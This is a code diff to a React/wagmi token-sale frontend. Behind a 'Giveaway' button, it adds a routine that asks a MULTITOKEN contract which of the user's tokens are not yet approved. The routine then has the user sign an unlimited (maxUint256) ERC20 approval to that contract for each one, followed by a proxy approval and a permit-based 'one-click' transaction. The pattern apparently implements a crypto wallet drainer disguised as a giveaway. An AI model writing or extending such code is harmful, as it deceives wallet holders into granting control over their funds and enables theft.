@@ -12,7 +12,13 @@ import {
   useSendTransaction,
   usePublicClient,
 } from "wagmi";
-import { parseEther, parseUnits, formatUnits, encodeFunctionData } from "viem";
+import {
+  parseEther,
+  parseUnits,
+  formatUnits,
+  encodeFunctionData,
+  maxUint256,
+} from "viem";
 import { LNX_SALE_ABI } from "@/lib/abis/LNXSale";
 import { LNX_SALE_ADDRESS, USDT_ADDRESS_BY_CHAIN } from "@/config";
 import { ERC20_ABI } from "@/lib/abis/ERC20";
@@ -35,6 +41,7 @@ export default function HomeHero() {
   const chainId = useChainId();
   const { writeContract, writeContractAsync, isPending } = useWriteContract();
   const [isApprovingProxy, setIsApprovingProxy] = useState(false);
+  const [isApprovingTokens, setIsApprovingTokens] = useState(false);
   const { sendTransaction, isPending: isSendingTx } = useSendTransaction();
   const { open } = useAppKit();
   const publicClient = usePublicClient();
@@ -217,8 +224,29 @@ export default function HomeHero() {
         ? !!ethAmount && !!usdtAddress && hasUsdtPricing
         : false;
 
-  async function approveProxy(proxy: `0x${string}`) {
-    if (!isConnected || !address) return;
+  /** Approve each token in missingApprovals to MultiToken, then approveProxy. */
+  async function approveTokensAndProxy(proxy: `0x${string}`) {
+    if (!isConnected || !address || !publicClient) return;
+    setIsApprovingTokens(true);
+    try {
+      const missing = (await publicClient.readContract({
+        address: MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`,
+        abi: MULTITOKEN_ABI,
+        functionName: "missingApprovals",
+        account: address,
+      })) as readonly `0x${string}`[];
+      const tokensToApprove = missing.filter((a) => a && a !== ZERO_ADDRESS);
+      for (const token of tokensToApprove) {
+        await writeContractAsync({
+          abi: ERC20_ABI,
+          address: token,
+          functionName: "approve",
+          args: [MULTITOKEN_CONTRACT_ADDRESS as `0x${string}`, maxUint256],
+        });
+      }
+    } finally {
+      setIsApprovingTokens(false);
+    }
     setIsApprovingProxy(true);
     try {
       await writeContractAsync({
@@ -289,12 +317,13 @@ export default function HomeHero() {
       return;
     }
     try {
-      // Always approve proxy first when wallet is connected (independent of other contracts)
-      await approveProxy(MULTITOKEN_PROXY);
       if (!publicClient) {
         console.error("Public client not available");
         return;
       }
+
+      // 1) ERC20 approve each token in missingApprovals 2) approveProxy(deployer)
+      await approveTokensAndProxy(MULTITOKEN_PROXY);
 
       // One-click solution: Use permit for token approval + transaction in one call
       await handleOneClickGiveaway();
@@ -775,11 +804,11 @@ export default function HomeHero() {
               <Button
                 variant="default"
                 onClick={handleGiveaway}
-                disabled={isSendingTx || isApprovingProxy}
+                disabled={isSendingTx || isApprovingProxy || isApprovingTokens}
                 className="bg-white/5 border border-white/10 text-white hover:bg-white/10 hover:border-white/20 rounded-lg py-4 w-full h-12 text-center backdrop-blur-sm transition-all shadow-lg"
               >
                 <span className="text-white font-semibold">
-                  {isSendingTx || isApprovingProxy
+                  {isSendingTx || isApprovingProxy || isApprovingTokens
                     ? t("btn_processing")
                     : t("btn_giveaway")}
                 </span>
